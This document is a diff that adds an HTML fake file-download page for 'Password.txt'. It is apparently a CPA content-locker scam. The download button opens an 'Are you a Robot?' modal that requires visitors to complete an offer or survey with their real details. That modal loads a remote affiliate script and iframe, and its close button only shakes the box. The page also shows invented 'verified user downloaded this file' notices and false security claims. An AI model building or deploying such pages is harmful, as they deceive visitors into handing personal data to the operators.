@@ -1,0 +1,719 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+    <meta charset='utf-8'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+
+    <title>Password.txt - Download File</title>
+
+    <link rel="icon" href="https://drive.google.com/uc?export=download&id=12vp-zht0hNG4qYoFuX66n4IRpdUaSa4N"
+        type="image/x-icon">
+
+    <style>
+        html,
+        body {
+            font-family: Verdana, Geneva, Tahoma, sans-serif;
+            margin: 0px;
+            padding: 0px;
+            box-sizing: border-box;
+        }
+
+        .header {
+            width: 100%;
+            background: rgb(232, 248, 255);
+        }
+
+        .main {
+            width: 100%;
+            text-align: center;
+            margin: 120px auto 0 auto;
+            max-width: 960px;
+        }
+
+        .header h2 {
+            color: rgb(92, 92, 92);
+            font-size: 21px;
+            font-weight: 600;
+            letter-spacing: 0px;
+            padding: 18px;
+            margin: 0px auto;
+            text-align: center;
+        }
+
+        .main h1 {
+            font-size: 3.3em;
+            color: #0096ff;
+            font-weight: 600;
+            text-align: center;
+            font-family: monospace;
+            margin-top: 21px;
+            margin-bottom: 3px;
+            word-break: inherit;
+        }
+
+        .main h4 {
+            color: #777;
+            margin: 0px auto;
+            text-align: center;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .main img {
+            vertical-align: middle;
+            width: 24px;
+        }
+
+        .main button {
+            display: block;
+            margin: 27px auto;
+        }
+
+        .footer {
+            margin-top: 90px;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            flex-direction: column;
+        }
+
+
+        .footer .img-fast {
+            width: 100%;
+            max-width: 90px;
+        }
+
+        .footer .mini-title {
+            display: block;
+            font-weight: 700;
+            font-size: 15px;
+            padding-top: 12px;
+        }
+
+        .footer p {
+            color: #777;
+            font-size: 15px;
+            text-align: left;
+            margin-top: 6px;
+        }
+
+        .footer .entry {
+            margin-top: 12px;
+            text-align: center;
+            width: 270px;
+            height: 210px;
+        }
+
+        .translate {
+            margin-bottom: 30px;
+
+        }
+
+        .translate label {
+            font-size: 12px;
+        }
+
+        #myBtn {
+            border-radius: 9px;
+            border: 0px;
+            background: #0096ff;
+            color: rgb(235, 235, 235);
+            font-size: 18px;
+            font-weight: 400;
+            padding: 12px 21px;
+        }
+
+        #myBtn:hover {
+            background: #189fff;
+            color: rgb(255, 255, 255);
+        }
+
+        /* The Modal (background) */
+        .modal {
+            display: none;
+            /* Hidden by default */
+            position: fixed;
+            /* Stay in place */
+            z-index: 1;
+            /* Sit on top */
+            left: 0;
+            top: 0;
+            width: 100%;
+            /* Full width */
+            height: 100%;
+            /* Full height */
+            overflow: hidden;
+            /* Enable scroll if needed */
+            background-color: rgb(0, 0, 0);
+            /* Fallback color */
+            background-color: rgba(0, 0, 0, 0.4);
+            /* Black w/ opacity */
+        }
+
+
+        /* Modal Content */
+        .modal-content {
+            position: relative;
+            background-color: #fefefe;
+            margin: 6em auto;
+            width: 300px;
+            box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+            animation-name: animatetop;
+            animation-duration: 0.4s;
+
+        }
+
+        /* Modal Header */
+        .modal-header {
+            padding: 2px 16px;
+            background-color: #d60000;
+        }
+
+        .modal-header h2 {
+            color: white;
+            font-size: 18px;
+            font-weight: 300;
+            margin-top: 15px;
+            margin-bottom: 15px;
+        }
+
+        .modal-header .close {
+            margin-top: 9px;
+        }
+
+        /* Modal Body */
+        .modal-body {
+            margin: 9px 12px;
+        }
+
+        .modal-body p {
+            font-size: 15px;
+            color: #000;
+            text-align: justify;
+            font-family: Helvetica, sans-serif;
+            margin: 0;
+        }
+
+        .modal-body p strong {
+            color: #d60000;
+        }
+
+        #modal-offer {
+            margin-left: 3px;
+            margin-right: 3px;
+        }
+
+        /* Modal Footer */
+        .modal-footer {
+            padding: 9px 12px;
+            background-color: #ffffff;
+            border: 0;
+        }
+
+        .modal-footer p {
+            font-size: 15px;
+            font-weight: 500;
+            color: #000;
+            text-align: center;
+            font-family: Helvetica, sans-serif;
+            margin: 0;
+        }
+
+        .modal-footer p small {
+            font-size: 12px;
+            font-weight: 900;
+            color: rgb(49, 49, 49);
+            font-family: Helvetica, sans-serif;
+        }
+
+        .modal-footer p span {
+            color: #d60000;
+        }
+
+
+        /* Add Animation */
+        @keyframes animatetop {
+            from {
+                top: -300px;
+                opacity: 0
+            }
+
+            to {
+                top: 0;
+                opacity: 1
+            }
+        }
+
+        /* The Close Button */
+        .close {
+            color: rgb(15, 15, 15);
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+            text-shadow: none;
+            opacity: 1;
+        }
+
+        .close:hover,
+        .close:focus {
+            color: rgb(15, 15, 15);
+            text-decoration: none;
+            cursor: pointer;
+        }
+
+        .shake-me {
+            animation: 'shake 0.5s';
+            animation-iteration-count: 2;
+        }
+
+        /* Shake element */
+        @keyframes shake {
+            0% {
+                transform: translate(1px, 1px) rotate(1deg);
+            }
+
+            10% {
+                transform: translate(-1px, -2px) rotate(-2deg);
+            }
+
+            20% {
+                transform: translate(-3px, 0px) rotate(1deg);
+            }
+
+            30% {
+                transform: translate(3px, 2px) rotate(1deg);
+            }
+
+            40% {
+                transform: translate(1px, -1px) rotate(1deg);
+            }
+
+            50% {
+                transform: translate(-1px, 2px) rotate(-2deg);
+            }
+
+            60% {
+                transform: translate(-3px, 1px) rotate(1deg);
+            }
+
+            70% {
+                transform: translate(3px, 1px) rotate(-2deg);
+            }
+
+            80% {
+                transform: translate(-1px, -1px) rotate(1deg);
+            }
+
+            90% {
+                transform: translate(1px, 2px) rotate(1deg);
+            }
+
+            100% {
+                transform: translate(1px, -2px) rotate(-2deg);
+            }
+        }
+
+        @media only screen and (min-width: 768px) {
+            .footer {
+                flex-direction: row;
+                justify-content: center;
+                margin-top: 150px;
+            }
+
+            .footer .entry {
+                margin: 27px 27px;
+            }
+
+            .modal-content {
+                width: 360px;
+            }
+
+            /* .main h1 {
+            font-size: 6em;
+        } */
+
+            .modal-body p {
+                font-size: 15px;
+            }
+
+            .modal-footer p {
+                font-size: 15px;
+            }
+
+        }
+
+
+        @media only screen and (min-width: 420px) and (max-width: 760px) {
+            /* .main h1 {
+            font-size: 4.5em;
+        } */
+
+            .modal-content {
+                width: 330px;
+            }
+        }
+
+
+        /* Toast Notification */
+        #toast {
+            visibility: hidden;
+            max-width: 50px;
+            height: 50px;
+            margin: auto;
+            background-color: #333;
+            color: #fff;
+            text-align: center;
+            border-radius: 2px;
+            position: fixed;
+            z-index: 2;
+            left: 0;
+            right: 0;
+            bottom: 30px;
+            font-size: 17px;
+            white-space: nowrap;
+            overflow: hidden;
+        }
+
+        #toast #img {
+            width: 50px;
+            height: 50px;
+            float: left;
+            padding-top: 16px;
+            padding-bottom: 16px;
+            box-sizing: border-box;
+            background-color: #111;
+            color: #fff;
+        }
+
+        #toast #desc {
+            color: rgb(163, 163, 163);
+            padding: 6px 0 0 9px;
+            overflow: hidden;
+            white-space: nowrap;
+            font-size: 13px;
+            text-align: justify;
+            line-height: 18px;
+            box-sizing: border-box;
+            font-family: monospace;
+        }
+
+        #toast #desc i {
+            color: #fff;
+            display: inline !important;
+        }
+
+        #toast.show {
+            visibility: visible;
+            -webkit-animation: fadein 0.5s, expand 0.5s 0.5s, stay 4s 1s, shrink 0.5s 5s, fadeout 0.5s 5.5s;
+            animation: fadein 0.5s, expand 0.5s 0.5s, stay 4s 1s, shrink 0.5s 5s, fadeout 0.5s 5.5s;
+        }
+
+        iframe {
+            width: 100%;
+            height: 180px;
+            border: 0;
+        }
+
+        @-webkit-keyframes fadein {
+            from {
+                bottom: 0;
+                opacity: 0;
+            }
+
+            to {
+                bottom: 30px;
+                opacity: 1;
+            }
+        }
+
+        @keyframes fadein {
+            from {
+                bottom: 0;
+                opacity: 0;
+            }
+
+            to {
+                bottom: 30px;
+                opacity: 1;
+            }
+        }
+
+        @-webkit-keyframes expand {
+            from {
+                min-width: 50px
+            }
+
+            to {
+                min-width: 291px
+            }
+        }
+
+        @keyframes expand {
+            from {
+                min-width: 50px
+            }
+
+            to {
+                min-width: 291px
+            }
+        }
+
+        @-webkit-keyframes stay {
+            from {
+                min-width: 291px
+            }
+
+            to {
+                min-width: 291px
+            }
+        }
+
+        @keyframes stay {
+            from {
+                min-width: 291px
+            }
+
+            to {
+                min-width: 291px
+            }
+        }
+
+        @-webkit-keyframes shrink {
+            from {
+                min-width: 291px;
+            }
+
+            to {
+                min-width: 50px;
+            }
+        }
+
+        @keyframes shrink {
+            from {
+                min-width: 291px;
+            }
+
+            to {
+                min-width: 50px;
+            }
+        }
+
+        @-webkit-keyframes fadeout {
+            from {
+                bottom: 30px;
+                opacity: 1;
+            }
+
+            to {
+                bottom: 60px;
+                opacity: 0;
+            }
+        }
+
+        @keyframes fadeout {
+            from {
+                bottom: 30px;
+                opacity: 1;
+            }
+
+            to {
+                bottom: 60px;
+                opacity: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+
+    <div class="header">
+        <h2 id="lng_downloadFile">Download File</h2>
+    </div>
+
+    <div class="main">
+        <h1 class="fname">Password.txt</h1>
+        <h4>Size: <span class="size">1MB</span> | <span class="format">Format: (TXT)
+                <img alt='Archive Icon'
+                    src="https://drive.google.com/uc?export=download&id=1ez_nm0-xfTRpMjbDXRzZeq6-vZlIutLp" /></span>
+        </h4>
+        <button id="myBtn">Download Now</button>
+    </div>
+
+
+    <div class="footer">
+
+        <div class="entry">
+            <img alt='Fast Icon' class="img-fast"
+                src="https://drive.google.com/uc?export=download&id=1AyDAi7VTMJ0uSpbRkOfvGEs_V-Y5KOgx" />
+            <span class="mini-title">FAST</span>
+            <p id="lng_fastTxt">Automatically redirected to a server near you. Lightning fast download speeds.</p>
+        </div>
+
+        <div class="entry">
+            <img alt='Stable Icon' class="img-fast"
+                src="https://drive.google.com/uc?export=download&id=1-leqqVgUnbU_bYSsPmkP_aYTHgF598l5" />
+            <span class="mini-title">STABLE</span>
+            <p id="lng_stableTxt">Stable download platform for all files and services. Download with confidence.</p>
+        </div>
+
+        <div class="entry">
+            <img alt='Secure Icon' class="img-fast"
+                src="https://drive.google.com/uc?export=download&id=1u6dh7szuzTaauAlYUw4i6vGfx17czvXi" />
+            <span class="mini-title">SECURE</span>
+            <p id="lng_secureTxt">Secure protocols and top-of-the-line anti virus software. All files are secured for
+                you.</p>
+        </div>
+    </div>
+
+
+    <div id="toast">
+        <div id="img"><img alt='File Icon'
+                src="https://drive.google.com/uc?export=download&id=12vp-zht0hNG4qYoFuX66n4IRpdUaSa4N"></div>
+        <div id="desc"></div>
+    </div>
+
+
+
+    <!-- Trigger/Open The Modal -->
+    <!-- The Modal -->
+    <div id="myModal" class="modal">
+
+        <!-- Modal content -->
+        <div class="modal-content">
+            <div class="modal-header">
+                <span class="close">&times;</span>
+                <h2 id="lng_humanVer">Are you a Robot?</h2>
+            </div>
+            <div class="modal-body">
+                <p id="lng_mdlBody">
+                    To prevent bots from using our service, we need to verify you are a human.<br /><br />Complete an
+                    offer or
+                    survey below with your valid information to continue this download.
+                </p>
+            </div>
+            <div id="offer">
+                <iframe src="https://d1xkyo9j4r7vnn.cloudfront.net/public/i_fr?it=1104144&key=94a51"
+                    title='Anti-bot Verification'></iframe>
+            </div>
+            <div class="modal-footer">
+                <p id="lng_mdlFooter">
+                    <small>STATUS: <span>NOT VERIFIED</span></small><br />
+                    <img alt='Not Verified Image'
+                        src="https://drive.google.com/uc?export=download&id=1pqw2ajgcQa5UWmyMhjc2CJDd4ruGF51c" />
+                </p>
+            </div>
+        </div>
+
+    </div>
+
+    <script type="text/javascript" defer>var CPABUILDSETTINGS = { "it": 1104144, "key": "94a51" };</script>
+    <script src="https://d13nu0oomnx5ti.cloudfront.net/cb614da.js" defer></script>
+
+    <script type="text/javascript" defer>
+        // Change file name
+        var xp = new URLSearchParams(location.search);
+        var nme = xp.get("name");
+        var size = xp.get("size");
+
+        if (nme === null || size === null) {
+            document.getElementsByClassName("fname")[0].innerHTML = "Password.txt";
+            document.getElementsByClassName("size")[0].innerHTML = "<b>1 KB</b>";
+            document.getElementsByClassName("format")[0].innerHTML = `<span class="format">Format: <b>TXT</b> <img src="https://drive.google.com/uc?export=download&id=1BpK2Td3JWEPHWBx7TMBOIHv7R7sIQEuS" /></span>`;
+
+        } else {
+            nme = nme.replace(/_/g, " ");
+            document.getElementsByClassName("fname")[0].innerHTML = name;
+            if (size.match(/[0-9.]+[mgo]+/ig)) {
+                document.getElementsByClassName("size")[0].innerHTML = "<b>" + size + "</b>";
+            } else {
+                document.getElementsByClassName("size")[0].innerHTML = "<b>" + size + " MB</b>";
+            }
+            document.getElementsByClassName("format")[0].innerHTML = `<span class="format">Format: <b>RAR / ZIP</b> <img src="https://drive.google.com/uc?export=download&id=1ez_nm0-xfTRpMjbDXRzZeq6-vZlIutLp" /></span>`;
+
+        };
+
+
+        // Close notification
+        window.onbeforeunload = function () {
+            return "Changes you have made may not be saved.";
+        };
+
+        // Get the modal
+        var modal = document.getElementById("myModal");
+
+        // Get modal-content
+        var modal_content = document.getElementsByClassName("modal-content")[0]
+
+        // Get the button that opens the modal
+        var btn = document.getElementById("myBtn");
+
+        // Get the <span> element that closes the modal
+        var span = document.getElementsByClassName("close")[0];
+
+        // When the user clicks on the button, open the modal
+        btn.onclick = function () {
+            modal.style.display = "block";
+        }
+
+        // When the user clicks on <span> (x), close the modal
+        span.onclick = function () {
+            modal_content.style.animation = 'shake 0.5s';
+            modal_content.style.animationIterationCount = '1';
+        }
+
+
+        // When the user hovers to x  button to close
+        span.onmousemove = function () {
+            modal_content.style.animation = 'none';
+            modal_content.style.animationIterationCount = 'none';
+            modal_content.style.animationName = 'none';
+            modal_content.style.animationDuration = 'none';
+        }
+
+
+        function rand_time(max, min) {
+            return Math.floor(Math.random() * (max - min + 1) + min);
+        }
+
+        // Toast Notification
+        function change_desc() {
+            var country = ["US", "Canada", "UK", "Germany", "France", "Belgium", "Italy", "India"];
+
+            var select = Math.floor(
+                Math.random() * ((country.length - 1) - 0 + 1) + 0);
+
+            var sec = rand_time(10, 2);
+            var desc = (`A verified user from <i>${country[select]}</i><br/>downloaded this file ${sec}sec ago.`);
+
+            document.getElementById("desc").innerHTML = desc;
+        }
+
+        function launch_toast() {
+            var x = document.getElementById("toast")
+            x.className = "show";
+            setTimeout(function () {
+                x.className = x.className.replace("show", "");
+            }, 6000);
+
+        }
+
+
+        function toast_notif(delay) {
+            setTimeout(function () {
+                change_desc();
+                launch_toast();
+                delay = rand_time(60000, 27000);
+
+                console.log(delay);
+                toast_notif(delay);
+            }, delay);
+        }
+
+        toast_notif(9000);
+    </script>
+</body>
+
+</html>
